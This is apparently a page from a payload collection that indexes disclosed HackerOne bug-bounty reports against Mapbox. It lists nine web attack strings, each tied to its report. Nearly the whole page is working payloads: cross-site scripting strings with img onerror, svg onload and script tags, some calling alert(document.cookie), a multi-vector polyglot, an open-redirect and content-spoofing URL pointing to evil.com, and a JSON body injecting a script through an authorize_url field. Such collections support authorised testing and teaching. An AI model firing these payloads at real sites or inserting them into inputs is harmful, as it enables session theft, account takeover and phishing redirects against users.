# Mapbox

9 payloads.

### `685e9ab6`

```
"><img src="x onerror=alert(document.cookie)>
```

— [Persistent cross-site scripting (XSS) in map attribution](https://hackerone.com/reports/54327) · Mapbox · [ph3t](https://hackerone.com/ph3t) · $1,000.0

### `7a765de4`

```
&lt;img src=x onerror=alert(1) "
```

**Parameter:** `title`
— [Stored Cross-Site Scripting in Map Share Page](https://hackerone.com/reports/65284) · Mapbox · [hussain_0x3c](https://hackerone.com/hussain_0x3c)

### `bc83870f`

```
<img src=x onerror=alert(1) "
```

**Parameter:** `title`
— [Stored Cross-Site Scripting in Map Share Page](https://hackerone.com/reports/65284) · Mapbox · [hussain_0x3c](https://hackerone.com/hussain_0x3c)

### `10c185eb`

```
<img src=x onerror=alert(1)"
```

— [Stored Cross-Site Scripting in Map Share Page](https://hackerone.com/reports/65284) · Mapbox · [hussain_0x3c](https://hackerone.com/hussain_0x3c)

### `9dddf33a`

```
"'><img src=a onerror=confirm(2)>"><script>alert(1);</script><iframe onload=alert(97)>"><svg onload=alert(2);>"onmouseover="confirm(2);<input onfocus=prompt(1) autofocus>"--> </script><svg/onload=';alert(/XSSPOSED/);'>"
```

— [XSS in L.mapbox.shareControl in mapbox.js](https://hackerone.com/reports/99245) · Mapbox · [enderun07](https://hackerone.com/enderun07) · $1,000.0

### `938e3da0`

```
<img src=a >\"><iframe onload=alert('XSS')>
```

— [XSS in L.mapbox.shareControl in mapbox.js](https://hackerone.com/reports/99245) · Mapbox · [enderun07](https://hackerone.com/enderun07) · $1,000.0

### `9e49b603`

```
https://target.com/studio/forbidden/?message=Hi%20You%20Are%20%20Not%20%20in%20Mapbox%20Please%20Go%20%20To%20http://evil.com&redirect=/evil.com/&path=%2Fstudio%2Fadmin%2F
```

**Parameter:** `redirect`
— [Content Spoofing and Local Redirect in Mapbox Studio](https://hackerone.com/reports/114529) · Mapbox · [hussain_0x3c](https://hackerone.com/hussain_0x3c)

### `7317f6a5`

```
https://target.com/authorize/?redirect_uri=%27%3E%3Csvg%20onload=%27alert%28document.domain%29%27%3E
```

**Parameter:** `redirect_uri`
— [XSS on target.com/authorize](https://hackerone.com/reports/143220) · Mapbox · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `3479adc6`

```
{
        "authorize_url": "'><script>alert(document.domain);</script>",
        "stage": "authorize",
        "user": {
          "name": "nombre",
          "extraTm2z": 1
       },
       "origin": ""
     }
```

— [XSS on target.com/authorize/ because of open redirect at /core/oauth/auth](https://hackerone.com/reports/143240) · Mapbox · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)
